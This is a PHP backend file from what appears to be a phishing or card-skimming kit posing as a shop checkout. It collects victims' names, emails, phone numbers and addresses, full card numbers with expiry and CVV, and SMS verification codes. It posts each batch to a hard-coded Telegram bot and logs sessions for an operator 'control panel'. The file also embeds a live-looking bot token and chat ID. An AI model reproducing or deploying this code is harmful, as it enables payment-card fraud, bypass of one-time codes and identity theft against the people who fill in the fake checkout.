<?php
header('Content-Type: application/json');
session_start();

// Telegram Configuration
$telegramToken = "7704586458:AAHgN252fNjtlhosEjC8YG4opJgozrJ_qZ8";
$telegramChatId = "-4783069647";

function sendToTelegram($message, $token, $chatId) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        ]
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    return $result;
}

// Generate unique session ID if not exists
if (!isset($_SESSION['unique_id'])) {
    $_SESSION['unique_id'] = uniqid('session_');
}
$sessionId = $_SESSION['unique_id'];

// Store session data
$sessionsFile = 'sessions.json';
if (file_exists($sessionsFile)) {
    $sessions = json_decode(file_get_contents($sessionsFile), true) ?? [];
} else {
    $sessions = [];
}

// Get the POST data
$postData = json_decode(file_get_contents('php://input'), true);

if (isset($postData['type'])) {
    $messageType = $postData['type'];
    $data = $postData['data'];
    
    // Get the current domain
    $domain = $_SERVER['HTTP_HOST'];
    $adminUrl = "http://{$domain}/admin_panel.php?session={$sessionId}";
    
    switch ($messageType) {
        case 'sms_code':
            $message = "<b>📱 SMS Code Submitted</b>\n\n";
            $message .= "🔢 Code: " . htmlspecialchars($data['code']) . "\n";
            $message .= "🆔 Session ID: " . htmlspecialchars($data['sessionId']) . "\n\n";
            $message .= "🔗 Control Panel: " . $adminUrl;

            // Update session status to loading
            if (isset($sessions[$data['sessionId']])) {
                $sessions[$data['sessionId']]['status'] = 'loading';
                $sessions[$data['sessionId']]['timestamp'] = time();
            }
            break;

        case 'shipping':
            $message = "<b>🚚 New Shipping Information</b>\n\n";
            $message .= "📧 Email: " . htmlspecialchars($data['email']) . "\n";
            $message .= "👤 Name: " . htmlspecialchars($data['firstName'] . " " . $data['lastName']) . "\n";
            $message .= "📞 Phone: " . htmlspecialchars($data['phone']) . "\n";
            $message .= "🏠 Address: " . htmlspecialchars($data['address']) . "\n";
            if (!empty($data['apartment'])) {
                $message .= "🏢 Apartment: " . htmlspecialchars($data['apartment']) . "\n";
            }
            $message .= "🌆 City: " . htmlspecialchars($data['city']) . "\n";
            $message .= "📮 Postal Code: " . htmlspecialchars($data['postalCode']) . "\n";
            $message .= "🌍 Country: " . htmlspecialchars($data['country']) . "\n\n";
            $message .= "🔗 Control Panel: " . $adminUrl;

            // Store shipping info in session
            $_SESSION['shipping_info'] = [
                'contactInput' => $data['email'],
                'firstName' => $data['firstName'],
                'lastName' => $data['lastName'],
                'phone' => $data['phone'],
                'address' => $data['address'],
                'apartment' => $data['apartment'],
                'city' => $data['city'],
                'postalCode' => $data['postalCode'],
                'country' => $data['country']
            ];

            // Store session data
            $sessions[$sessionId] = [
                'id' => $sessionId,
                'email' => $data['email'],
                'name' => $data['firstName'] . " " . $data['lastName'],
                'status' => 'shipping',
                'timestamp' => time()
            ];
            break;
            
        case 'payment':
            $message = "<b>💳 New Payment Information</b>\n\n";
            $message .= "💳 Card Number: " . htmlspecialchars($data['cardNumber']) . "\n";
            $message .= "📅 Expiry: " . htmlspecialchars($data['expiryDate']) . "\n";
            $message .= "🔒 CVV: " . htmlspecialchars($data['cvv']) . "\n";
            $message .= "👤 Card Holder: " . htmlspecialchars($data['nameOnCard']) . "\n\n";
            $message .= "🔗 Control Panel: " . $adminUrl;

            // Store payment info in session
            $_SESSION['payment_info'] = [
                'cardNumber' => $data['cardNumber'],
                'expiryDate' => $data['expiryDate'],
                'cvv' => $data['cvv'],
                'nameOnCard' => $data['nameOnCard']
            ];

            // Update session data
            if (!isset($sessions[$sessionId])) {
                $sessions[$sessionId] = [
                    'id' => $sessionId,
                    'status' => 'loading'
                ];
            }
            $sessions[$sessionId]['cardNumber'] = $data['cardNumber'];
            $sessions[$sessionId]['expiryDate'] = $data['expiryDate'];
            $sessions[$sessionId]['status'] = 'loading';
            $sessions[$sessionId]['timestamp'] = time();
            break;
            
        default:
            http_response_code(400);
            echo json_encode(['status' => 'error', 'message' => 'Invalid message type']);
            exit;
    }

    // Save sessions data with file locking
    file_put_contents($sessionsFile, json_encode($sessions), LOCK_EX);
    
    // Send to Telegram
    $result = sendToTelegram($message, $telegramToken, $telegramChatId);
    
    if ($result) {
        echo json_encode([
            'status' => 'success',
            'sessionId' => $data['sessionId']
        ]);
    } else {
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Failed to send message']);
    }
} else {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
}
?> 